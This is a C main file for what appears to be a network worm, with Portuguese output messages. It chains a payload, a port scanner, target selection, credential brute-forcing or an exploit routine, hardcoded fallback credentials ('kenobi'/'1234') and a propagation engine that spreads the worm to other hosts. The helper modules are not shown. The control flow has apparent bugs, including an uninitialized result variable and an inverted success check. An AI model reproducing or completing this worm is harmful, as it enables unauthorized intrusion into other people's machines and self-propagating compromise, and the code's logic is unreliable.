#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <unistd.h>
#include "bruteforce.h"
#include "exploit.h"
#include "payload.h"
#include "portscanner.h"
#include "propagation_engine.h"
#include "target_selection.h"

void main(int argc, char *argv[]){
    char range_ipSeq[100];
    char range_portSeq[100];
    char username[25];
    char pass[25];
    char **paramIPPort;
    char **entryExploit = malloc(4 * sizeof(char*));
    unsigned int lenKey;
    int random, success, i;
    pid_t child;

    if(argc < 4){
        printf("Entrada incorreta.\n\n");
        fflush(stdout);
        printf("A entrada deve seguir o seguinte modelo: ./worm <ip ou range de ips> <porta ou range de portas> <tamanho da chave>\n");
        fflush(stdout);
        exit(0);
    }

    //Pega os ranges
    strcpy(range_ipSeq, argv[1]);
    strcpy(range_portSeq, argv[2]);
    lenKey = atoi(argv[3]);
    
    for(i=0; i < 4 ; ++i ){
        entryExploit[i] = (char*) malloc(20*sizeof(char)); 
    }
    
    
    printf("-----------------------------------\n");
    printf("Payload iniciado\n"); 
    printf("-----------------------------------\n");
    
    payload();
    
    printf("-----------------------------------\n");
    printf("Payload finalizado\n"); 

    printf("-----------------------------------\n");
    printf("Port Scanner iniciado\n"); 
    printf("-----------------------------------\n");
    
    initPortScanner(range_ipSeq, range_portSeq);
    
    printf("Port Scanner finalizado\n"); 

    srand(time(NULL));
    random = rand();

    paramIPPort = malloc(2*sizeof(char *));
    
    printf("-----------------------------------\n");
    printf("Target Selection iniciado\n"); 
    printf("-----------------------------------\n");
    
    target_selection(paramIPPort);
    
    printf("Target Selection finalizado\n"); 

    printf("-----------------------------------\n");
    printf("Exploits iniciados\n"); 
    printf("-----------------------------------\n");
    
    strncpy(entryExploit[0], "./worm", 20);
    strncpy(entryExploit[1], "-a", 20);
    strncpy(entryExploit[2], "-d", 20);
    strncpy(entryExploit[3], paramIPPort[0], 20);
    
    if(random % 2){
        success = bruteforce(lenKey, paramIPPort[0], username, pass);
        if(success == 0){
            child = vfork();
            if(child == -1){
                perror("");
            }else if(child == 0){
                success = exploitMain(4, entryExploit);
                _exit(23);
            }
            if(success == EXIT_FAILURE){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
            
            strcpy(username, "kenobi");
            strcpy(pass, "1234");
        }
    }else{
        child = vfork();
        if(child == -1){
            perror("");
        }else if(child == 0){
            success = exploitMain(4, entryExploit);
            _exit(23);
        }

        strcpy(username, "kenobi");
        strcpy(pass, "1234");
        
        if(success == EXIT_FAILURE){
            success = bruteforce(lenKey, paramIPPort[0], username, pass);
            if(success == 0){
                printf("Não foi possivel obter acesso.\n");
                exit(0);
            }
        }
    }

    printf("-----------------------------------\n");
    printf("Exploits finalizados\n"); 
    printf("-----------------------------------\n");
    printf("Propagation Engine iniciado\n"); 
    printf("-----------------------------------\n");
    
    propagation_engine(paramIPPort[0], username, pass);
    
    printf("-----------------------------------\n");
    printf("Propagation Engine finalizado\n"); 
    printf("-----------------------------------\n");
}
